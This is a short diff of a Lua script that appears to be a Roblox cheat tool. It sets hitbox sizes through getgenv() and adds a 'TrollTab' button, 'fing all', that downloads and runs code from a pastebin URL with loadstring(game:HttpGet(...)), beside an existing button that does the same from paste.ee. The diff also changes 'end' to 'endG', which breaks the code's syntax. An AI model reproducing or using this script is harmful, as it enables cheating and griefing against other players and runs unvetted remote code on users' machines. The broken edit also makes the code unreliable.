@@ -6,7 +6,7 @@ local function isNumber(str)
   if tonumber(str) ~= nil or str == 'inf' then
     return true
   end
-end
+endG
 
 getgenv().HitboxSize = 15
 getgenv().HitboxTransparency = 1
@@ -2731,6 +2731,9 @@ workspace:FindFirstChild("CCTV").Camera.CFrame = game.Players.LocalPlayer.Charac
 end)
 wait(.0000000000001)
 end
+end)
+TrollTab:Button("fing all", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 end)
 TrollTab:Button("📌🔪 - Painel Fling// Op", function()
     loadstring(game:HttpGet("https://paste.ee/r/NTtmf",true))()
